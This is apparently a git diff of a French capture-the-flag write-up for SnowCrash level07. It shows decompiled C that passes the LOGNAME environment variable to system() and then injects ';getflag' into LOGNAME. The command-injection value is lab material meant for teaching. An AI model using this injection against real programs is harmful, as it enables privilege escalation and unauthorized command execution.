@@ -5,27 +5,31 @@ level07@SnowCrash:~$ ls
 level07
 ```
 
-En décompilant le binaire via le site https://dogbolt.org/
-On observe que :
-```c
-    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
-    return system(var_1c);
-```
-Récupère la valeur de la variable d’environnement LOGNAME via getenv("LOGNAME").
+En décompilant le binaire via le site [dogbolt](https://dogbolt.org)
 
-Par défaut, le programme affiche simplement la valeur de LOGNAME
 ```c
+char *var_1c = NULL;
+asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
+return system(var_1c);
+```
+
+On observe qu'il récupère la valeur de la variable d’environnement **LOGNAME** via `getenv("LOGNAME")`.
+
+Par défaut, le programme affiche simplement la valeur de **LOGNAME**
+```bash
 level07@SnowCrash:~$ ./level07 
 level07
 ```
 
-On peut confirmer la valeur actuelle de LOGNAME
+On peut confirmer la valeur actuelle de **LOGNAME**
 ```bash
 level07@SnowCrash:~$ env | grep LOGNAME
 LOGNAME=level07
 ```
 
-On modifie donc la variable d’environnement LOGNAME pour y injecter un appel à `getflag`
+Le programme ne fait pas un simple ajout d'argument à la commande `echo`, mais à la place format le prompt comme si c'était une commande.
+
+On peut donc modifier la variable d’environnement **LOGNAME** pour y injecter un appel à `getflag`.
 
 ```bash
 level07@SnowCrash:~$ export LOGNAME=";getflag"
